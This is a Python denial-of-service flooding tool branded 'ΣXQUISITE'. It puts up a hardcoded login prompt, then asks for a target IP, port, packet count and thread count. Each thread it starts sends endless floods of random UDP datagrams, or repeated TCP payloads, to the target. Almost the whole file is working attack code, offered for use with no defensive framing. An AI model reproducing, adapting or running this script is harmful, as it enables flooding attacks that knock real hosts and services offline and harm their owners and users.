import random
import socket
import threading
import os
import time,sys

os.system("clear")
print("""\033[37m
   ▀      ▄▄  ▄███▄
 ▄▀▀▀▄   ▄█████████▀
 █    █  ▄██████  █▀
 █    █  ▀██████████▄
 ▀▄   ▀▀▀▀▀▀▀▀█▀▀██▀
   █  ▀▄▄    ▄▄▀   ██▀
 █▄▄▄▄▄▄▄█    ███▄▄
\r""")
print("     - ΣXQUISITE -\n\r")

print("""\033[31m╔═[\033[34mUsername\033[31m]""")
username = str(input("\033[31m╚════> \033[34m"))
print("""\033[31m╔═[\033[34mPassword\033[31m]""")
password = str(input("\033[31m╚════> \033[34m"))
time.sleep(2)
os.system("clear")
print("\033[31m[\033[37mStatus\033[31m] ═>[\033[37mLoading...\033[31m]<═")
time.sleep(0.8)
os.system("clear")
print("\033[31m[\033[37mStatus\033[31m] ═>[\033[37mLoading..\033[31m]<═")
time.sleep(0.8)
os.system("clear")
print("\033[31m[\033[37mStatus\033[31m] ═>[\033[37mLoading.\033[31m]<═")
time.sleep(0.8)
os.system("clear")
print("\033[31m[\033[37mStatus\033[31m] ═>[\033[37mLoading..\033[31m]<═")
time.sleep(0.8)
os.system("clear")
print("\033[31m[\033[37mStatus\033[31m] ═>[\033[37mLoading...\033[31m]<═")
time.sleep(0.8)
os.system("clear")
print("\033[31m[\033[37mStatus\033[31m] ═>[\033[37mLoading..\033[31m]<═")
time.sleep(0.8)
os.system("clear")
print("\033[31m[\033[37mStatus\033[31m] ═>[\033[37mLoading.\033[31m]<═")
time.sleep(0.8)
os.system("clear")
print("\033[31m[\033[37mStatus\033[31m] ═>[\033[37mLoading..\033[31m]<═")
time.sleep(0.8)
os.system("clear")
print("\033[31m[\033[37mStatus\033[31m] ═>[\033[37mLoading...\033[31m]<═")
time.sleep(0.8)
os.system("clear")
print("\033[31m[\033[37mStatus\033[31m] ═>[\033[37mLoading..\033[31m]<═")
time.sleep(0.8)
os.system("clear")
print("\033[31m[\033[37mStatus\033[31m] ═>[\033[37mLoading.\033[31m]<═")
time.sleep(0.8)
os.system("clear")
print("\033[31m[\033[37mStatus\033[31m] ═>[\033[37mLoading..\033[31m]<═")
time.sleep(0.8)
os.system("clear")
print("\033[31m[\033[37mStatus\033[31m] ═>[\033[37mLoading...\033[31m]<═")
time.sleep(0.8)
os.system("clear")
if username == "ZieL" and password == "#zielx":
	print("\033[34m[\033[37mStatus\033[34m] ═>[\033[37mLogin Succesfull\033[34m]<═")
	time.sleep(2.5)
else:
	print("\033[34m[\033[37mStatus\033[34m] ═>[\033[37mCan't Login To Tools\033[34m]<═")
	exit()
	
os.system("clear")
print("""
\033[34m╔═╗═╗ ╦╔═╗ ╦ ╦\033[31m╦╔═╗╦╔╦╗╔═╗
\033[34m║╣ ╔╩╦╝║═╬╗║ ║\033[31m║╚═╗║ ║ ║╣ 
\033[34m╚═╝╩ ╚═╚═╝╚╚═╝\033[31m╩╚═╝╩ ╩ ╚═╝

\033[31m[\033[37mTeam\033[31m]        ═>[\033[37m  ΣXQUISITE++ \033[31m]<═
\033[34m[\033[37mDiscord\033[34m]     ═>[  \033[37mZ1#7872\033[34m     ]<═
\033[32m[\033[37mCreate Date\033[32m] ═>[\033[37m  3/Sep/2022\033[32m  ]<═
\n\r""")

print("""\033[31m╔═[\033[34mZieL - Host/Ip\033[31m]""")
ip = str(input("\033[31m╚════> \033[34m"))
print("""\033[31m╔═[\033[34mZieL - Port\033[31m]""")
port = int(input("\033[31m╚════> \033[34m"))
print("""\033[31m╔═[\033[34mZieL - Times\033[31m]""")
times = int(input("\033[31m╚════> \033[34m"))
print("""\033[31m╔═[\033[34mZieL - Threads\033[31m]""")
threads = int(input("\033[31m╚════> \033[34m"))
print("""\033[31m╔═[\033[34mZieL - Ready? \033[37m(\033[32my/\033[31mn\033[37m) \033[31m]""")
choice = str(input("\033[31m╚════> \033[34m"))
if choice == 'n':
	exit()
os.system("clear")

def run():
  data = random._urandom(1024)
  i = random.choice(("[+]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +" \033[37mAttack Has Send To \033[31m%s\033[37m:\033[31m%s"%(ip,port))
    except:
      print(i +" \033[37mAttack Has Send To \033[31m%s\033[37m:\033[31m%s"%(ip,port))

def run2():
  data = random._urandom(999)
  i = random.choice(("[+]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +" \033[37mAttack Has Send To \033[31m%s\033[37m:\033[31m%s"%(ip,port))
    except:
      s.close()
      print(i +" \033[37mAttack Has Send To \033[31m%s\033[37m:\033[31m%s"%(ip,port))

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
  else:
   	th = threading.Thread(target = run2)
   	th.start()
